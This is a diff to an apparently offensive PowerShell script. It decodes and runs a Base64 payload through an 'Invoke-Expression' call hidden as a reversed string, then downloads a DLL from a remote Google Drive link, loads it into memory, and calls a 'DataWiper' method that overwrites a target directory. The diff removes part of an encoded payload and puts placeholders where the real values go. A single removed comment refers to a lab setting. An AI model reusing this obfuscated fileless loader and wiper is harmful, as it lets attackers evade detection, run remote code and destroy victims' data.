@@ -2,29 +2,19 @@
 $hostinfo = Get-Host
 $lang = $hostinfo.CurrentCulture.DisplayName
 
-# Base64 payload (PowerShell command, likely obfuscated)
+# Base64 payload (PowerShell command, update as needed)
 $t1 = @"
-JAAxADIAMwAxACAAPQAgAEcAZQBUAC0ASABvAHMAdAA7ACAAJAA0ADIAMgAxACAAPQAgACQAMQAyADMAMQAuAEM...
-...QAAgAHsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAFAAUwBDAG8AbQBtAGEAbgBkAFAA
-YQB0AGgAIAB9AA==
+<YOUR_BASE64_STRING>
 "@
-
-# Decode payload from Base64 (Unicode)
 $t2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t1))
-
-# Obfuscated command to invoke: "Invoke-Expression"
 $t3 = "noiSSerpxE-eKOvNI"
 $t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
-
-# Execute the decoded command
 &($t4) $t2
 
-# Confirmation (for lab context)
 Write-Host "This has been downloaded off a remote server and executed."
 
-
 # Download the DLL into memory
-$url = "https://drive.google.com/uc?export=download&id=XXXX" # Replace XXXX with real ID
+$url = "https://drive.google.com/uc?export=download&id=PUT_REAL_ID_HERE"
 $webClient = New-Object System.Net.WebClient
 $dllBytes = $webClient.DownloadData($url)
 
@@ -32,17 +22,16 @@ $dllBytes = $webClient.DownloadData($url)
 $assembly = [System.Reflection.Assembly]::Load($dllBytes)
 
 # Find the class and method (adjust if needed)
-$type = $assembly.GetType("DataWiper")  # Must match the class name in the DLL
+$type = $assembly.GetType("DataWiper")
 $method = $type.GetMethod("WipeData")
 
 # Set wipe parameters
 $targetPath = "C:\SensitiveData"  # Replace with actual target
-$passes = 3                        # Number of overwrite passes
+$passes = 3
 
 # Invoke method from memory-loaded assembly
 $result = $method.Invoke($null, @($targetPath, $passes))
 
-# Output result
 if ($result) {
     Write-Host "Wipe operation succeeded."
 } else {
